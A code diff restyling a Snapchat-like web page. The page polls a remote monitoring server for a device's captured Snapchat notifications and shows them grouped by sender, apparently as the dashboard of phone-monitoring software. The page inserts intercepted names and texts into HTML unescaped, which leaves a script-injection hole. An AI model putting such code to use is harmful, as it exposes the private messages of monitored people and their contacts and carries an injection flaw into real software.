@@ -40,37 +40,56 @@
             align-items: center; 
             height: 50px;
         }
+        
+        /* 🔥 NEW BACK BUTTON STYLE */
         .header-left { display: flex; align-items: center; gap: 10px; cursor: pointer; }
-        .avatar-small { width: 38px; height: 38px; background: #eee; border-radius: 50%; overflow: hidden; }
-        .page-title { font-weight: 700; font-size: 1.2rem; color: #000; }
-        .header-right { display: flex; gap: 15px; color: #000; font-size: 1.2rem; }
+        .back-arrow-main { font-size: 1.2rem; color: #222; margin-right: 5px; }
+
+        .avatar-small { 
+            width: 40px; height: 40px; 
+            border-radius: 50%; 
+            overflow: hidden; 
+            display: flex; justify-content: center; align-items: center;
+            font-weight: bold; color: rgba(0,0,0,0.5); font-size: 1.2rem;
+        }
+        
+        .page-title { font-weight: 700; font-size: 1.3rem; color: #000; flex: 1; text-align: center; }
+        .header-right { display: flex; gap: 15px; color: #444; font-size: 1.2rem; }
 
         .friend-list { flex: 1; overflow-y: auto; }
         
         .friend-row { 
             display: flex; align-items: center; 
-            padding: 10px 15px; 
+            padding: 8px 15px; 
             border-bottom: 1px solid #fafafa; 
             cursor: pointer; 
-            height: 60px;
+            height: 64px;
         }
         .friend-row:active { background: #f8f8f8; }
 
-        .bitmoji { width: 48px; height: 48px; margin-right: 12px; border-radius: 50%; background: #f0f0f0; overflow: hidden; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #ccc; }
+        .bitmoji { 
+            width: 48px; height: 48px; margin-right: 12px; 
+            border-radius: 50%; 
+            overflow: hidden; display: flex; align-items: center; justify-content: center; 
+            font-size: 1.4rem; color: #fff; text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
         
         .friend-data { flex: 1; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
-        .friend-data h3 { margin: 0; font-size: 1.05rem; font-weight: 500; color: #000; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .friend-data h3 { margin: 0; font-size: 1.1rem; font-weight: 600; color: #000; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         
-        .status-row { display: flex; align-items: center; gap: 8px; margin-top: 4px; }
-        .status-icon { width: 12px; height: 12px; border-radius: 3px; display: inline-block; }
+        .status-row { display: flex; align-items: center; gap: 6px; margin-top: 3px; }
         
-        /* Status Colors */
-        .st-red { background-color: #f23c57; border: 1px solid #f23c57; } /* Snap */
-        .st-blue { background-color: #3cb2e2; border-radius: 50%; width: 12px; height: 12px;} /* Chat */
-        .st-purple { background-color: #9b55a0; border-radius: 50%; } /* Video */
+        /* 🔥 REAL SNAPCHAT STATUS ICONS */
+        .status-box { width: 10px; height: 10px; border-radius: 2px; display: inline-block; margin-right: 2px;}
+        .status-bubble { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 2px; border: 2px solid transparent;}
         
-        .st-text { font-size: 0.8rem; color: #888; font-weight: 400; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
-        .st-time { font-size: 0.75rem; color: #bbb; margin-left: 5px; border-left: 1px solid #eee; padding-left: 5px;}
+        .st-red { background-color: #F23C57; } /* Red Square (Snap) */
+        .st-blue { background-color: #3CB2E2; } /* Blue Bubble (Chat) */
+        .st-purple { background-color: #9B55A0; } /* Purple (Video) */
+        
+        .st-text { font-size: 0.85rem; color: #657786; font-weight: 400; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
+        .st-time { font-size: 0.85rem; color: #657786; margin-left: 5px; position: relative; padding-left: 5px;}
+        .st-time::before { content: "•"; position: absolute; left: -2px; color: #ddd; }
 
         .cam-btn { 
             width: 40px; height: 40px; border-radius: 50%; 
@@ -101,24 +120,28 @@
         .s-msg { 
             padding: 8px 12px; 
             max-width: 75%; 
-            font-size: 1rem; 
+            font-size: 1.05rem; 
             position: relative;
-            background: #fcfcfc;
-            color: #333;
-            border-left: 3px solid #3cb2e2; /* Default Chat Color */
+            background: #fff;
+            color: #000;
+            border-left: 3px solid #eee;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: 0.2s;
         }
+        .s-msg:hover { background: #f9f9f9; }
         
         .s-in { align-self: flex-start; }
-        .s-time-float { font-size: 0.65rem; color: #aaa; margin-top: 4px; display: block;}
+        .s-time-float { font-size: 0.65rem; color: #ccc; display: block; margin-top: 2px;}
 
         .chat-bottom { padding: 10px; border-top: 1px solid #eee; display: flex; align-items: center; gap: 10px; background: #fff; }
-        .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; }
+        .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; font-size: 1rem; }
 
         .bottom-nav { 
-            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; opacity: 0.8; 
+            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; 
         }
-        .nav-item { font-size: 1.4rem; color: #ccc; }
-        .nav-active { color: #3cb2e2; }
+        .nav-item { font-size: 1.4rem; color: #aaa; }
+        .nav-active { color: #3CB2E2; } /* Snapchat Blue */
 
     </style>
 </head>
@@ -129,12 +152,14 @@
         <div id="snapListScreen">
             <div class="snap-header">
                 <div class="header-left" onclick="window.location.href='index.html'">
-                     <div class="avatar-small">
-                        <div style="width:100%; height:100%; background:#FFFC00; display:flex; justify-content:center; align-items:center;">👻</div>
+                    <i class="fa-solid fa-chevron-left back-arrow-main"></i>
+                    <div class="avatar-small" style="background: #eee;">
+                        <i class="fa-solid fa-user"></i>
                     </div>
-                    <i class="fa-solid fa-magnifying-glass" style="color:#666; font-size:1.1rem; margin-left:10px;"></i>
                 </div>
+                
                 <div class="page-title">Chat</div>
+                
                 <div class="header-right">
                     <i class="fa-solid fa-user-plus"></i>
                     <i class="fa-solid fa-ellipsis"></i>
@@ -149,8 +174,8 @@
 
             <div class="bottom-nav">
                 <div class="nav-item"><i class="fa-solid fa-location-dot"></i></div>
-                <div class="nav-item nav-active"><i class="fa-regular fa-comment"></i></div>
-                <div class="nav-item"><i class="fa-solid fa-camera" style="font-size:1.8rem; color:#FFFC00; -webkit-text-stroke: 1px #ccc;"></i></div>
+                <div class="nav-item nav-active"><i class="fa-solid fa-message"></i></div>
+                <div class="nav-item"><i class="fa-solid fa-camera" style="font-size:1.8rem; color:#FFFC00; -webkit-text-stroke: 1px #ddd;"></i></div>
                 <div class="nav-item"><i class="fa-solid fa-user-group"></i></div>
                 <div class="nav-item"><i class="fa-solid fa-play"></i></div>
             </div>
@@ -158,20 +183,20 @@
 
         <div id="snapChatScreen">
             <div class="chat-top">
-                <i class="fa-solid fa-chevron-left" style="font-size:1.5rem; color:#000; cursor:pointer; padding:5px;" onclick="closeSnap()"></i>
-                <div class="bitmoji" style="width:35px; height:35px; font-size:1rem; margin-right:5px;">👻</div>
+                <i class="fa-solid fa-chevron-left" style="font-size:1.5rem; color:#222; cursor:pointer; padding:5px; margin-right: 5px;" onclick="closeSnap()"></i>
+                <div class="bitmoji" id="chatAvatar" style="width:35px; height:35px; font-size:1rem; margin-right:8px;">👻</div>
                 <div class="chat-name" id="snapName">Friend</div>
-                <i class="fa-solid fa-phone" style="font-size:1.1rem; color:#666; margin-right:15px; background:#f0f0f0; padding:8px; border-radius:50%"></i>
-                <i class="fa-solid fa-video" style="font-size:1.1rem; color:#666; background:#f0f0f0; padding:8px; border-radius:50%"></i>
+                <i class="fa-solid fa-phone" style="font-size:1rem; color:#444; margin-right:15px; background:#f0f0f0; padding:10px; border-radius:50%"></i>
+                <i class="fa-solid fa-video" style="font-size:1rem; color:#444; background:#f0f0f0; padding:10px; border-radius:50%"></i>
             </div>
             
             <div class="snap-msgs" id="snapMsgsBox">
             </div>
 
             <div class="chat-bottom">
-                <i class="fa-solid fa-camera" style="color:#000; font-size:1.2rem; background:#f0f0f0; padding:8px; border-radius:50%"></i>
+                <i class="fa-solid fa-camera" style="color:#222; font-size:1.2rem; background:#f0f0f0; padding:10px; border-radius:50%"></i>
                 <input type="text" class="snap-input" placeholder="Send a chat">
-                <i class="fa-solid fa-microphone" style="color:#000; font-size:1.2rem;"></i>
+                <i class="fa-solid fa-microphone" style="color:#222; font-size:1.2rem; margin-left: 5px;"></i>
             </div>
         </div>
 
@@ -179,11 +204,10 @@
 
     <script>
         // --- CONFIG & LOGIC ---
-        const DEVICE_ID = localStorage.getItem('monitoring_id');
+        const DEVICE_ID = localStorage.getItem('monitoring_id'); // Ensure this is set in index.html
         const BASE_URL = "https://child-v9no.onrender.com/api/get-data";
         
-        // Request specific 'snapchat' file
-        const DATA_TYPE = "snapchat";
+        const DATA_TYPE = "snapchat"; // Specific request for snapchat logs
 
         if (!DEVICE_ID) {
             alert("Device ID missing! Redirecting...");
@@ -191,63 +215,78 @@
         }
 
         let groupedSnaps = {};
+        let isFetching = false;
+
+        // --- 🎨 UTILITY: Random Color for Avatar ---
+        function getAvatarColor(name) {
+            const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEEAD', '#D4A5A5', '#9B59B6', '#3498DB'];
+            let hash = 0;
+            for (let i = 0; i < name.length; i++) {
+                hash = name.charCodeAt(i) + ((hash << 5) - hash);
+            }
+            return colors[Math.abs(hash) % colors.length];
+        }
+
+        function getInitials(name) {
+            return name.substring(0, 1).toUpperCase();
+        }
 
         // 1. Fetch Data
         async function fetchSnapData() {
+            if(isFetching) return;
+            isFetching = true;
+
             try {
-                // Endpoint: /api/get-data/ID/snapchat
-                const response = await fetch(`${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`);
+                const response = await fetch(`${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}?t=${Date.now()}`);
                 const result = await response.json();
 
                 if (Array.isArray(result) && result.length > 0) {
                     processSnapData(result);
                 } else {
-                    document.getElementById('snapContainer').innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Chats Found</p>";
+                    document.getElementById('snapContainer').innerHTML = "<div style='text-align:center; padding:50px; color:#ccc'><i class='fa-solid fa-box-open' style='font-size:2rem'></i><br>No Chats Yet</div>";
                 }
             } catch (error) {
                 console.error("Error fetching data:", error);
+            } finally {
+                isFetching = false;
             }
         }
 
         // 2. Process & Group Data
         function processSnapData(logs) {
-            groupedSnaps = {};
-
-            // Sort by time ascending (Old -> New)
+            // Sort by time ascending
             logs.sort((a, b) => (a.time || 0) - (b.time || 0));
+
+            const tempGroup = {};
 
             logs.forEach(log => {
                 let rawTitle = (log.title || "").trim();
                 let rawText = (log.text || "").trim();
                 let time = log.time || Date.now();
 
-                // Garbage collection
-                if(rawText.includes("is typing") || rawText.includes("Updating")) return;
+                // 🗑️ Garbage Filter
+                if(rawText.includes("is typing") || rawText.includes("Updating") || rawText === "New Snap") return;
 
                 let senderName = "Unknown";
                 let messageBody = rawText;
 
                 // --- LOGIC: NAME DETECTION ---
-                // Snap Notifications often come as Title: "Snapchat", Text: "Rahul sent you a chat"
                 if (rawTitle === "Snapchat") {
                     if (rawText.includes(":")) {
-                        // "Rahul: Hello there"
                         let parts = rawText.split(":");
                         senderName = parts[0].trim();
                         messageBody = parts.slice(1).join(":").trim();
                     } else if (rawText.toLowerCase().includes("snap")) {
-                         // "New Snap from Rahul" -> System Notification bucket
-                         senderName = "Snap Notifications";
+                         senderName = "Snap Team";
                     } else {
-                        senderName = "Snap Notifications";
+                        senderName = "Snapchat";
                     }
                 } else {
-                    // Title is "Rahul"
                     senderName = rawTitle;
                 }
 
-                if (!groupedSnaps[senderName]) {
-                    groupedSnaps[senderName] = {
+                if (!tempGroup[senderName]) {
+                    tempGroup[senderName] = {
                         name: senderName,
                         lastMsg: "",
                         lastTime: 0,
@@ -255,27 +294,32 @@
                     };
                 }
 
-                groupedSnaps[senderName].msgs.push({
+                tempGroup[senderName].msgs.push({
                     text: messageBody,
-                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+                    rawTime: time
                 });
 
-                groupedSnaps[senderName].lastMsg = messageBody;
-                groupedSnaps[senderName].lastTime = time;
+                tempGroup[senderName].lastMsg = messageBody;
+                tempGroup[senderName].lastTime = time;
             });
 
-            renderSnaps();
+            // Compare with old data to avoid re-rendering if same
+            if(JSON.stringify(groupedSnaps) !== JSON.stringify(tempGroup)) {
+                groupedSnaps = tempGroup;
+                renderSnaps();
+            }
         }
 
-        // 3. Render List
+        // 3. Render List (With Scroll Fix)
         function renderSnaps() {
             const con = document.getElementById('snapContainer');
             const users = Object.keys(groupedSnaps);
             
-            if(users.length === 0) {
-                con.innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Data</p>";
-                return;
-            }
+            // 🔥 Save Scroll Position
+            const scrollPos = con.scrollTop;
+
+            if(users.length === 0) return;
 
             // Sort: Newest chats at top
             users.sort((a, b) => groupedSnaps[b].lastTime - groupedSnaps[a].lastTime);
@@ -285,48 +329,56 @@
                 const s = groupedSnaps[user];
                 
                 // Styling based on message type
-                let statusClass = "st-blue"; // Default Chat (Blue)
-                let statusText = "New Chat";
+                let statusHtml = `<span class="status-box st-red"></span> <span class="st-text" style="color:#F23C57; font-weight:600">New Snap</span>`;
                 
-                if (user === "Snap Notifications") {
-                    statusClass = "st-red"; // Red for system snaps
-                    statusText = "New Snap";
+                // Logic: If message contains 'chat' -> Blue, else Red
+                if (!s.lastMsg.toLowerCase().includes("snap")) {
+                    statusHtml = `<span class="status-bubble st-blue" style="background:#3CB2E2"></span> <span class="st-text" style="color:#3CB2E2; font-weight:600">New Chat</span>`;
                 }
 
+                // Avatar Color
+                const avatarColor = getAvatarColor(user);
+                const initial = getInitials(user);
+
                 html += `
-                    <div class="friend-row" onclick="openSnap('${user}')">
-                        <div class="bitmoji">
-                            ${user === "Snap Notifications" ? '<i class="fa-solid fa-bell" style="font-size:1.2rem"></i>' : '👻'}
+                    <div class="friend-row" onclick="openSnap('${user}', '${avatarColor}')">
+                        <div class="bitmoji" style="background: ${avatarColor};">
+                            ${initial}
                         </div>
                         <div class="friend-data">
                             <h3>${s.name}</h3>
                             <div class="status-row">
-                                <span class="status-icon ${statusClass}"></span>
-                                <span class="st-text">
-                                    ${statusText} • ${s.lastMsg}
-                                </span>
+                                ${statusHtml}
+                                <span class="st-text" style="color:#999; margin-left:5px;">• ${s.lastMsg}</span>
                                 <span class="st-time">${new Date(s.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                             </div>
                         </div>
                         <div class="cam-btn"><i class="fa-regular fa-comment-dots"></i></div>
                     </div>`;
             });
+            
             con.innerHTML = html;
+            
+            // 🔥 Restore Scroll Position
+            con.scrollTop = scrollPos;
         }
 
         // 4. Open Chat
-        function openSnap(userName) {
+        function openSnap(userName, color) {
             const s = groupedSnaps[userName];
             
             if(s) {
                 document.getElementById('snapName').innerText = s.name;
+                document.getElementById('chatAvatar').innerText = getInitials(s.name);
+                document.getElementById('chatAvatar').style.background = color;
+                
                 const box = document.getElementById('snapMsgsBox');
                 box.innerHTML = "";
                 
                 s.msgs.forEach(m => {
-                    // Logic to change color: if it contains "New Snap" make it Red/Bold, else Blue msg
-                    let borderStyle = "border-left: 3px solid #3cb2e2;";
-                    if(m.text.toLowerCase().includes("snap")) borderStyle = "border-left: 3px solid #f23c57;";
+                    // Chat Border Logic
+                    let borderStyle = "border-left: 3px solid #3CB2E2;"; // Blue
+                    if(m.text.toLowerCase().includes("snap")) borderStyle = "border-left: 3px solid #F23C57;"; // Red
 
                     box.innerHTML += `
                         <div class="s-msg s-in" style="${borderStyle}">
@@ -348,7 +400,7 @@
 
         // Auto Refresh
         fetchSnapData();
-        setInterval(fetchSnapData, 5000);
+        setInterval(fetchSnapData, 4000); // 4 Seconds Refresh
 
     </script>
 </body>
